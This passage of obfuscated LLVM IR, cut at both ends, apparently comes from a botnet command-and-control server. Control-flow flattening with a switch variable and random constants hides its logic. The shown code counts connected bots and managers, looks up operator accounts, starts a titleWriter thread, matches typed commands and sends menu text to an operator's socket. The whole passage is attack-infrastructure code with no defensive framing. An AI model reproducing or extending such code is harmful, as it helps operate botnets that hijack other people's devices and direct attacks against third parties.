  %379 = call i8* @strstr(i8* %378, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0)) #8
  %380 = icmp ne i8* %379, null
  %381 = select i1 %380, i32 1919318703, i32 -1064280221
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %384 = call i32 @clientsConnected()
  %385 = load volatile i32, i32* @managesConnected, align 4
  %386 = call i32 (i8*, i8*, ...) @sprintf(i8* %383, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.34, i32 0, i32 0), i32 %384, i32 %385) #7
  %387 = load i32, i32* %4, align 4
  %388 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %389 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %390 = call i64 @strlen(i8* %389) #8
  %391 = call i64 @send(i32 %387, i8* %388, i64 %390, i32 16384)
  %392 = icmp eq i64 %391, -1
  %393 = select i1 %392, i32 1920153956, i32 -1250706196
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  store i32 -1250706196, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  store i32 -1064280221, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %398 = call i8* @strstr(i8* %397, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0)) #8
  %399 = icmp ne i8* %398, null
  %400 = select i1 %399, i32 -2056959592, i32 1544188791
  store i32 %400, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %403 = call i8* @strstr(i8* %402, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #8
  %404 = icmp ne i8* %403, null
  %405 = select i1 %404, i32 -2056959592, i32 -1324392028
  store i32 %405, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %408 = call i8* @strstr(i8* %407, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0)) #8
  %409 = icmp ne i8* %408, null
  %410 = select i1 %409, i32 -2056959592, i32 -101794791
  store i32 %410, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %413 = call i32 (i8*, i8*, ...) @sprintf(i8* %412, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0)) #7
  %414 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %415 = call i32 (i8*, i8*, ...) @sprintf(i8* %414, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %416 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %417 = call i32 (i8*, i8*, ...) @sprintf(i8* %416, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.40, i32 0, i32 0)) #7
  %418 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %419 = call i32 (i8*, i8*, ...) @sprintf(i8* %418, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.41, i32 0, i32 0)) #7
  %420 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %421 = call i32 (i8*, i8*, ...) @sprintf(i8* %420, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.42, i32 0, i32 0)) #7
  %422 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %423 = call i32 (i8*, i8*, ...) @sprintf(i8* %422, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.43, i32 0, i32 0)) #7
  %424 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %425 = call i32 (i8*, i8*, ...) @sprintf(i8* %424, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.44, i32 0, i32 0)) #7
  %426 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %427 = call i32 (i8*, i8*, ...) @sprintf(i8* %426, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.45, i32 0, i32 0)) #7
  %428 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %429 = call i32 (i8*, i8*, ...) @sprintf(i8* %428, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i32 0, i32 0)) #7
  %430 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %431 = call i32 (i8*, i8*, ...) @sprintf(i8* %430, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.47, i32 0, i32 0)) #7
  %432 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %433 = call i32 (i8*, i8*, ...) @sprintf(i8* %432, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %434 = load i32, i32* %4, align 4
  %435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %436 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %437 = call i64 @strlen(i8* %436) #8
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  %440 = select i1 %439, i32 -139933864, i32 623875022
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i32, i32* %4, align 4
  %444 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %445 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i32 0, i32 0
  %446 = call i64 @strlen(i8* %445) #8
  %447 = call i64 @send(i32 %443, i8* %444, i64 %446, i32 16384)
  %448 = icmp eq i64 %447, -1
  %449 = select i1 %448, i32 132064297, i32 313997406
  store i32 %449, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:451:                                    ; preds = %loopEntry
  %452 = load i32, i32* %4, align 4
  %453 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %454 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i32 0, i32 0
  %455 = call i64 @strlen(i8* %454) #8
  %456 = call i64 @send(i32 %452, i8* %453, i64 %455, i32 16384)
  %457 = icmp eq i64 %456, -1
  %458 = select i1 %457, i32 -1393828428, i32 -1959402805
  store i32 %458, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = load i32, i32* %4, align 4
  %462 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %463 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i32 0, i32 0
  %464 = call i64 @strlen(i8* %463) #8
  %465 = call i64 @send(i32 %461, i8* %462, i64 %464, i32 16384)
  %466 = icmp eq i64 %465, -1
  %467 = select i1 %466, i32 1155020558, i32 -104686350
  store i32 %467, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i32, i32* %4, align 4
  %471 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %472 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i32 0, i32 0
  %473 = call i64 @strlen(i8* %472) #8
  %474 = call i64 @send(i32 %470, i8* %471, i64 %473, i32 16384)
  %475 = icmp eq i64 %474, -1
  %476 = select i1 %475, i32 2101872946, i32 -1948179826
  store i32 %476, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i32, i32* %4, align 4
  %480 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %481 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i32 0, i32 0
  %482 = call i64 @strlen(i8* %481) #8
  %483 = call i64 @send(i32 %479, i8* %480, i64 %482, i32 16384)
  %484 = icmp eq i64 %483, -1
  %485 = select i1 %484, i32 -1558159766, i32 -93935791
  store i32 %485, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:487:                                    ; preds = %loopEntry
  %488 = load i32, i32* %4, align 4
  %489 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %490 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i32 0, i32 0
  %491 = call i64 @strlen(i8* %490) #8
  %492 = call i64 @send(i32 %488, i8* %489, i64 %491, i32 16384)
  %493 = icmp eq i64 %492, -1
  %494 = select i1 %493, i32 1574645227, i32 -1978595635
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load i32, i32* %4, align 4
  %498 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %499 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i32 0, i32 0
  %500 = call i64 @strlen(i8* %499) #8
  %501 = call i64 @send(i32 %497, i8* %498, i64 %500, i32 16384)
  %502 = icmp eq i64 %501, -1
  %503 = select i1 %502, i32 301065318, i32 -1111495627
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i32, i32* %4, align 4
  %507 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %508 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i32 0, i32 0
  %509 = call i64 @strlen(i8* %508) #8
  %510 = call i64 @send(i32 %506, i8* %507, i64 %509, i32 16384)
  %511 = icmp eq i64 %510, -1
  %512 = select i1 %511, i32 -491260494, i32 937895497
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i32, i32* %4, align 4
  %516 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %517 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i32 0, i32 0
  %518 = call i64 @strlen(i8* %517) #8
  %519 = call i64 @send(i32 %515, i8* %516, i64 %518, i32 16384)
  %520 = icmp eq i64 %519, -1
  %521 = select i1 %520, i32 577279107, i32 -1707440861
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %4, align 4
  %525 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %526 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i32 0, i32 0
  %527 = call i64 @strlen(i8* %526) #8
  %528 = call i64 @send(i32 %524, i8* %525, i64 %527, i32 16384)
  %529 = icmp eq i64 %528, -1
  %530 = select i1 %529, i32 143636807, i32 1473514884
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = load i8*, i8** %3, align 8
  %534 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %533) #7
  store i32 229766724, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %537 = load i32, i32* %5, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %538
  %540 = getelementptr inbounds %struct.account, %struct.account* %539, i32 0, i32 0
  %541 = getelementptr inbounds [20 x i8], [20 x i8]* %540, i32 0, i32 0
  %542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %543 = call i32 (i8*, i8*, ...) @sprintf(i8* %536, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %541, i8* %542) #7
  %544 = load i32, i32* %4, align 4
  %545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %547 = call i64 @strlen(i8* %546) #8
  %548 = call i64 @send(i32 %544, i8* %545, i64 %547, i32 16384)
  %549 = icmp eq i64 %548, -1
  %550 = select i1 %549, i32 658096482, i32 -1770909859
  store i32 %550, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  store i32 228577667, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %556 = call i8* @strstr(i8* %555, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.48, i32 0, i32 0)) #8
  %557 = icmp ne i8* %556, null
  %558 = select i1 %557, i32 1663052553, i32 1206132379
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %561 = call i8* @strstr(i8* %560, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0)) #8
  %562 = icmp ne i8* %561, null
  %563 = select i1 %562, i32 1663052553, i32 -1454173707
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %566 = call i8* @strstr(i8* %565, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0)) #8
  %567 = icmp ne i8* %566, null
  %568 = select i1 %567, i32 1663052553, i32 -1552000320
  store i32 %568, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %571 = call i8* @strstr(i8* %570, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)) #8
  %572 = icmp ne i8* %571, null
  %573 = select i1 %572, i32 1663052553, i32 -848776134
  store i32 %573, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %576 = call i32 (i8*, i8*, ...) @sprintf(i8* %575, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.52, i32 0, i32 0)) #7
  %577 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %578 = call i32 (i8*, i8*, ...) @sprintf(i8* %577, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %579 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %580 = call i32 (i8*, i8*, ...) @sprintf(i8* %579, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.53, i32 0, i32 0)) #7
  %581 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %582 = call i32 (i8*, i8*, ...) @sprintf(i8* %581, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.54, i32 0, i32 0)) #7
  %583 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %584 = call i32 (i8*, i8*, ...) @sprintf(i8* %583, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.55, i32 0, i32 0)) #7
  %585 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %586 = call i32 (i8*, i8*, ...) @sprintf(i8* %585, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.56, i32 0, i32 0)) #7
  %587 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %588 = call i32 (i8*, i8*, ...) @sprintf(i8* %587, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %589 = load i32, i32* %4, align 4
  %590 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %591 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i32 0, i32 0
  %592 = call i64 @strlen(i8* %591) #8
  %593 = call i64 @send(i32 %589, i8* %590, i64 %592, i32 16384)
  %594 = icmp eq i64 %593, -1
  %595 = select i1 %594, i32 -2060124482, i32 -1528085202
  store i32 %595, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = load i32, i32* %4, align 4
  %599 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %600 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i32 0, i32 0
  %601 = call i64 @strlen(i8* %600) #8
  %602 = call i64 @send(i32 %598, i8* %599, i64 %601, i32 16384)
  %603 = icmp eq i64 %602, -1
  %604 = select i1 %603, i32 920846390, i32 -811197583
  store i32 %604, i32* %switchVar
  br label %loopEnd

; <label>:605:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:606:                                    ; preds = %loopEntry
  %607 = load i32, i32* %4, align 4
  %608 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %609 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i32 0, i32 0
  %610 = call i64 @strlen(i8* %609) #8
  %611 = call i64 @send(i32 %607, i8* %608, i64 %610, i32 16384)
  %612 = icmp eq i64 %611, -1
  %613 = select i1 %612, i32 432675768, i32 593789210
  store i32 %613, i32* %switchVar
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:615:                                    ; preds = %loopEntry
  %616 = load i32, i32* %4, align 4
  %617 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %618 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i32 0, i32 0
  %619 = call i64 @strlen(i8* %618) #8
  %620 = call i64 @send(i32 %616, i8* %617, i64 %619, i32 16384)
  %621 = icmp eq i64 %620, -1
  %622 = select i1 %621, i32 -408380973, i32 -38174676
  store i32 %622, i32* %switchVar
  br label %loopEnd

; <label>:623:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = load i32, i32* %4, align 4
  %626 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %627 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i32 0, i32 0
  %628 = call i64 @strlen(i8* %627) #8
  %629 = call i64 @send(i32 %625, i8* %626, i64 %628, i32 16384)
  %630 = icmp eq i64 %629, -1
  %631 = select i1 %630, i32 -853795986, i32 -611734240
  store i32 %631, i32* %switchVar
  br label %loopEnd

; <label>:632:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  %634 = load i32, i32* %4, align 4
  %635 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %636 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i32 0, i32 0
  %637 = call i64 @strlen(i8* %636) #8
  %638 = call i64 @send(i32 %634, i8* %635, i64 %637, i32 16384)
  %639 = icmp eq i64 %638, -1
  %640 = select i1 %639, i32 239718280, i32 1182293349
  store i32 %640, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i32, i32* %4, align 4
  %644 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %645 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i32 0, i32 0
  %646 = call i64 @strlen(i8* %645) #8
  %647 = call i64 @send(i32 %643, i8* %644, i64 %646, i32 16384)
  %648 = icmp eq i64 %647, -1
  %649 = select i1 %648, i32 36409457, i32 1200503902
  store i32 %649, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:651:                                    ; preds = %loopEntry
  %652 = load i8*, i8** %3, align 8
  %653 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %652) #7
  store i32 -442309029, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %656 = load i32, i32* %5, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %657
  %659 = getelementptr inbounds %struct.account, %struct.account* %658, i32 0, i32 0
  %660 = getelementptr inbounds [20 x i8], [20 x i8]* %659, i32 0, i32 0
  %661 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %662 = call i32 (i8*, i8*, ...) @sprintf(i8* %655, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %660, i8* %661) #7
  %663 = load i32, i32* %4, align 4
  %664 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %665 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %666 = call i64 @strlen(i8* %665) #8
  %667 = call i64 @send(i32 %663, i8* %664, i64 %666, i32 16384)
  %668 = icmp eq i64 %667, -1
  %669 = select i1 %668, i32 -1125598083, i32 1657451319
  store i32 %669, i32* %switchVar
  br label %loopEnd

; <label>:670:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  store i32 -749049959, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  store i32 473462240, i32* %switchVar
  br label %loopEnd

; <label>:673:                                    ; preds = %loopEntry
  %674 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %675 = call i8* @strstr(i8* %674, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i32 0, i32 0)) #8
  %676 = icmp ne i8* %675, null
  %677 = select i1 %676, i32 231757984, i32 -519678905
  store i32 %677, i32* %switchVar
  br label %loopEnd

; <label>:678:                                    ; preds = %loopEntry
  %679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %680 = call i8* @strstr(i8* %679, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0)) #8
  %681 = icmp ne i8* %680, null
  %682 = select i1 %681, i32 231757984, i32 426437235
  store i32 %682, i32* %switchVar
  br label %loopEnd

; <label>:683:                                    ; preds = %loopEntry
  %684 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %685 = call i8* @strstr(i8* %684, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %686 = icmp ne i8* %685, null
  %687 = select i1 %686, i32 231757984, i32 -1009069689
  store i32 %687, i32* %switchVar
  br label %loopEnd

; <label>:688:                                    ; preds = %loopEntry
  %689 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %690 = call i8* @strstr(i8* %689, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0)) #8
  %691 = icmp ne i8* %690, null
  %692 = select i1 %691, i32 231757984, i32 -96376927
  store i32 %692, i32* %switchVar
  br label %loopEnd

; <label>:693:                                    ; preds = %loopEntry
  %694 = load i8*, i8** %3, align 8
  %695 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %694) #7
  %696 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %697 = call i32 (i8*, i8*, ...) @sprintf(i8* %696, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.61, i32 0, i32 0)) #7
  %698 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %699 = call i32 (i8*, i8*, ...) @sprintf(i8* %698, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %700 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %701 = call i32 (i8*, i8*, ...) @sprintf(i8* %700, i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str.62, i32 0, i32 0)) #7
  %702 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %703 = call i32 (i8*, i8*, ...) @sprintf(i8* %702, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.63, i32 0, i32 0)) #7
  %704 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i32 0, i32 0
  %705 = call i32 (i8*, i8*, ...) @sprintf(i8* %704, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.64, i32 0, i32 0)) #7
  %706 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i32 0, i32 0
  %707 = call i32 (i8*, i8*, ...) @sprintf(i8* %706, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.65, i32 0, i32 0)) #7
  %708 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i32 0, i32 0
  %709 = call i32 (i8*, i8*, ...) @sprintf(i8* %708, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.66, i32 0, i32 0)) #7
  %710 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i32 0, i32 0
  %711 = call i32 (i8*, i8*, ...) @sprintf(i8* %710, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %712 = load i32, i32* %4, align 4
  %713 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %714 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i32 0, i32 0
  %715 = call i64 @strlen(i8* %714) #8
  %716 = call i64 @send(i32 %712, i8* %713, i64 %715, i32 16384)
  %717 = icmp eq i64 %716, -1
  %718 = select i1 %717, i32 1278683446, i32 -600112771
  store i32 %718, i32* %switchVar
  br label %loopEnd

; <label>:719:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:720:                                    ; preds = %loopEntry
  %721 = load i32, i32* %4, align 4
  %722 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %723 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i32 0, i32 0
  %724 = call i64 @strlen(i8* %723) #8
  %725 = call i64 @send(i32 %721, i8* %722, i64 %724, i32 16384)
  %726 = icmp eq i64 %725, -1
  %727 = select i1 %726, i32 -1038128071, i32 -1043269274
  store i32 %727, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  %730 = load i32, i32* %4, align 4
  %731 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %732 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i32 0, i32 0
  %733 = call i64 @strlen(i8* %732) #8
  %734 = call i64 @send(i32 %730, i8* %731, i64 %733, i32 16384)
  %735 = icmp eq i64 %734, -1
  %736 = select i1 %735, i32 -343099869, i32 1689499786
  store i32 %736, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  store i32 -1268742680, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i32, i32* %4, align 4
  %740 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %741 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i32 0, i32 0
  %742 = call i64 @strlen(i8* %741) #8
  %743 = call i64 @send(i32 %739, i8* %740, i64 %742, i32 16384)
  %744 = icmp eq i64 %743, -1
  %745 = select i1 %744, i32 1184421389, i32 -850762293
  store i32 %745, i32* %switchVar
  br label %loopEnd

; <label>:746:                                    ; preds = %loopEntry
